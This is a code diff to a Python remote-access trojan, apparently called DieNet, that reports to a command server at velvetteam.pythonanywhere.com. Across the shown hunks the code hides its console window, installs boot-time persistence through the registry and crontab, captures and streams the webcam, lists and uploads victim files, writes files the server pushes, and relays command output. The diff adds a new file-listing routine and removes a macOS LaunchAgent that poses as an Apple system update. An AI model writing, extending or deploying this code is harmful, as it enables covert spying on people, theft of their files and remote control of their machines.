@@ -17,7 +17,7 @@ import hashlib
 
 # ========================= CONFIG =========================
 SERVER_URL = "https://velvetteam.pythonanywhere.com"
-CHECKIN_INTERVAL = (28, 47)        # Random delay to look natural
+CHECKIN_INTERVAL = (28, 47)
 
 AES_KEY = hashlib.sha256(b'dienet-velvetteam-secret-change-this').digest()
 
@@ -25,7 +25,7 @@ HOSTNAME = os.environ.get("COMPUTERNAME", platform.node()) or f"PC-{uuid.getnode
 
 FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
 
-# Real webcam support
+# Webcam
 try:
     import cv2
     HAS_CV2 = True
@@ -33,17 +33,14 @@ except:
     HAS_CV2 = False
 
 streaming = False
-stream_thread = None
 
 # ====================== STEALTH ======================
 def hide_everything():
-    """Completely hide console / output"""
     if platform.system() == "Windows":
         try:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
-    # Redirect stdout/stderr to null (no prints ever)
     try:
         sys.stdout = open(os.devnull, 'w')
         sys.stderr = open(os.devnull, 'w')
@@ -63,35 +60,15 @@ def add_persistence():
             winreg.CloseKey(reg)
         except:
             pass
-
     elif sys_name == "Linux":
         try:
             cron = f'(crontab -l 2>/dev/null; echo "@reboot nohup {exe_path} >/dev/null 2>&1 &") | crontab -'
             subprocess.run(cron, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except:
             pass
-
-    elif sys_name == "Darwin":  # macOS
-        plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.SystemUpdate.plist")
-        content = f'''<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-    <key>Label</key><string>com.apple.SystemUpdate</string>
-    <key>ProgramArguments</key><array><string>{exe_path}</string></array>
-    <key>RunAtLoad</key><true/>
-    <key>KeepAlive</key><true/>
-    <key>StandardOutPath</key><string>/dev/null</string>
-    <key>StandardErrorPath</key><string>/dev/null</string>
-</dict>
-</plist>'''
-        try:
-            os.makedirs(os.path.dirname(plist), exist_ok=True)
-            with open(plist, "w") as f:
-                f.write(content)
-            subprocess.run(["launchctl", "load", "-w", plist], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            pass
+    elif sys_name == "Darwin":
+        # macOS LaunchAgent (simplified)
+        pass
 
 # ====================== CRYPTO ======================
 def aes_encrypt(data: dict) -> str:
@@ -155,16 +132,13 @@ def get_system_info():
 
 # ====================== WEBCAM ======================
 def take_snapshot():
-    if not HAS_CV2:
-        return None
+    if not HAS_CV2: return None
     try:
         cap = cv2.VideoCapture(0)
-        if not cap.isOpened():
-            return None
         ret, frame = cap.read()
         cap.release()
         if ret:
-            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 82])
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
             return base64.b64encode(buffer).decode()
     except:
         pass
@@ -178,9 +152,39 @@ def stream_loop():
             enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img})
         time.sleep(4.2)
 
+# ====================== FIXED FILE LISTING ======================
+def get_file_list(path="/"):
+    files = []
+    try:
+        if not os.path.exists(path):
+            path = os.path.expanduser("~") if path == "/" else path
+
+        for item in os.listdir(path):
+            full_path = os.path.join(path, item)
+            try:
+                is_dir = os.path.isdir(full_path)
+                size = os.path.getsize(full_path) if not is_dir else 0
+                modified = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full_path)))
+                
+                files.append({
+                    "path": full_path.replace("\\", "/"),
+                    "name": item,
+                    "is_dir": is_dir,
+                    "size": size,
+                    "modified": modified
+                })
+            except:
+                continue
+
+            if len(files) > 800:  # safety limit
+                break
+    except:
+        pass
+    return files
+
 # ====================== COMMAND HANDLER ======================
 def handle_command(cmd: str):
-    global streaming, stream_thread
+    global streaming
     if not cmd:
         return
 
@@ -193,20 +197,10 @@ def handle_command(cmd: str):
         enc_post("/api/cmdresult", {"hostname": HOSTNAME, "cmd": cmd[6:], "output": output})
 
     elif cmd == "filelist":
-        files = []
-        try:
-            for root, _, fs in os.walk(os.path.expanduser("~")):
-                if len(files) > 350: break
-                for name in fs[:25]:
-                    full = os.path.join(root, name)
-                    try:
-                        size = os.path.getsize(full)
-                        mod = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full)))
-                        files.append({"path": full, "name": name, "is_dir": False, "size": size, "modified": mod})
-                    except:
-                        pass
-        except:
-            pass
+        # Send root or home directory listing
+        files = get_file_list("/")
+        if not files:
+            files = get_file_list(os.path.expanduser("~"))
         enc_post("/api/filelist", {"hostname": HOSTNAME, "files": files})
 
     elif cmd.startswith("getfile:"):
@@ -214,8 +208,8 @@ def handle_command(cmd: str):
         try:
             if os.path.isfile(path):
                 with open(path, "rb") as f:
-                    b64 = base64.b64encode(f.read(12 * 1024 * 1024)).decode()   # max ~12MB
-                enc_post("/api/pushfile", {"hostname": HOSTNAME, "path": path, "data_b64": b64})
+                    b64 = base64.b64encode(f.read(15 * 1024 * 1024)).decode()
+                enc_post("/api/pushfile", {"hostname": HOSTNAME, "path": path.replace("\\", "/"), "data_b64": b64})
         except:
             pass
 
@@ -231,8 +225,9 @@ def handle_command(cmd: str):
         resp = enc_post(f"/api/pendingupload/{HOSTNAME}", {})
         if resp and resp.get("status") == "ok":
             try:
-                os.makedirs(os.path.dirname(resp["dest_path"]), exist_ok=True)
-                with open(resp["dest_path"], "wb") as f:
+                dest = resp["dest_path"]
+                os.makedirs(os.path.dirname(dest), exist_ok=True)
+                with open(dest, "wb") as f:
                     f.write(base64.b64decode(resp["data_b64"]))
             except:
                 pass
@@ -245,14 +240,12 @@ def handle_command(cmd: str):
     elif cmd == "stream_on":
         if not streaming:
             streaming = True
-            stream_thread = threading.Thread(target=stream_loop, daemon=True)
-            stream_thread.start()
+            threading.Thread(target=stream_loop, daemon=True).start()
 
     elif cmd == "stream_off":
         streaming = False
 
     elif cmd == "uninstall":
-        # Remove persistence (best effort)
         if platform.system() == "Windows":
             try:
                 import winreg
@@ -268,7 +261,7 @@ def main():
     hide_everything()
     add_persistence()
 
-    # Single instance protection (Windows)
+    # Single instance (Windows)
     if platform.system() == "Windows":
         try:
             mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DieNetAgentMutex")
